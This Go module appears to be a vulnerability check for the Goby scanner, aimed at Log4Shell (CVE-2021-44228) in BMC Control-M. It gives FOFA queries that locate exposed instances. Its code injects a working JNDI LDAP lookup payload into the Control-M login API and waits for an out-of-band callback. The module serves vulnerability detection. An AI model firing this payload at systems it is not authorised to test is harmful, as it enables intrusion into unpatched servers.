package exploits

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strconv"
	"time"
)

func init() {
	expJson := `{
    "Name": "Control-M log4j2 Remote command execution vulnerability (CVE-2021-44228)",
    "Description": "<p>Control-M is a cross-platform batch job scheduling management software. It adopts C/S mode, installs Enterprise Manager and server on the server, installs the agent on the controlled host, and the agent can submit the defined by Control-M on the host Job flow, and return the running result.</p><p>Control-M log4j2 has a remote command execution vulnerability. Attackers can use this vulnerability to execute commands arbitrarily on the server side, write to the backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Impact": "Control-M log4j2 Remote command execution vulnerability (CVE-2021-44228)",
    "Recommendation": "<p>The supplier has released a solution, please upgrade to the new version:<a href=\"https://github.com/apache/logging-log4j2/tags/\">https://github.com/apache/logging-log4j2/tags/</a></p><p>1. Deploy a web application firewall to monitor database operations.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Control-M",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Control-M log4j2 命令执行漏洞（CVE-2021-44228）",
            "Description": "<p>Control-M是一个跨平台的批量作业调度管理软件，采用C/S模式，在服务器上安装Enterprise Manager和服务器，在被控主机上安装agent, agent可以在主机上提交由Control-M定义好的作业流，并返回运行结果。</p><p>Control-M log4j2 存在命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行命令，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Impact": "<p>Control-M log4j2 存在命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行命令，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>⼚商已发布了漏洞方案，请及时关注： <a href=\"https://github.com/apache/logging-log4j2/tags/\">https://github.com/apache/logging-log4j2/tags/</a></p><p></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "Control-M",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Control-M log4j2 Remote command execution vulnerability (CVE-2021-44228)",
            "Description": "<p>Control-M is a cross-platform batch job scheduling management software. It adopts C/S mode, installs Enterprise Manager and server on the server, installs the agent on the controlled host, and the agent can submit the defined by Control-M on the host Job flow, and return the running result.</p><p>Control-M log4j2 has a remote command execution vulnerability. Attackers can use this vulnerability to execute commands arbitrarily on the server side, write to the backdoor, obtain server permissions, and then control the entire web server.</p>",
            "Impact": "Control-M log4j2 Remote command execution vulnerability (CVE-2021-44228)",
            "Recommendation": "<p>The supplier has released a solution, please upgrade to the new version:<a href=\"https://github.com/apache/logging-log4j2/tags/\" target=\"_blank\">https://github.com/apache/logging-log4j2/tags/</a></p><p>1. Deploy a web application firewall to monitor database operations.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "Control-M",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "(cert=\"BMC Control-M Root CA\") || title=\"Control-M Welcome Page\"",
    "GobyQuery": "(cert=\"BMC Control-M Root CA\") || title=\"Control-M Welcome Page\"",
    "Author": "fmbd",
    "Homepage": "https://www.bmc.com/it-solutions/control-m.html",
    "DisclosureDate": "2021-12-23",
    "References": [
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228",
        "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
    ],
    "HasExp": false,
    "Is0day": false,
    "Level": "3",
    "CVSS": "10.0",
    "CVEIDs": [
        "CVE-2021-44228"
    ],
    "CNVD": [
        "CNVD-2021-95914"
    ],
    "CNNVD": [
        "CNNVD-202112-799"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10246"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			cmd := fmt.Sprintf("${jndi:ldap://%s}", checkUrl)
			cmd_hex := hex.EncodeToString([]byte(cmd))
			cmd_len_hex := strconv.FormatInt(int64(len(cmd)), 16)
			payload := "0a" + cmd_len_hex + cmd_hex + "1201311a" + cmd_len_hex + cmd_hex + "2001"
			payload1, _ := hex.DecodeString(payload)
			payload_base64 := base64.StdEncoding.EncodeToString(payload1)
			uri := "/ControlM/rest/EmWebServices/login"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/json")
			cfg.Data = "{\"data\":\"" + payload_base64 + "\"}"
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			httpclient.DoHttpRequest(u, cfg)
			return godclient.PullExists(checkStr, time.Second*10)
		},
		nil,
	))
}
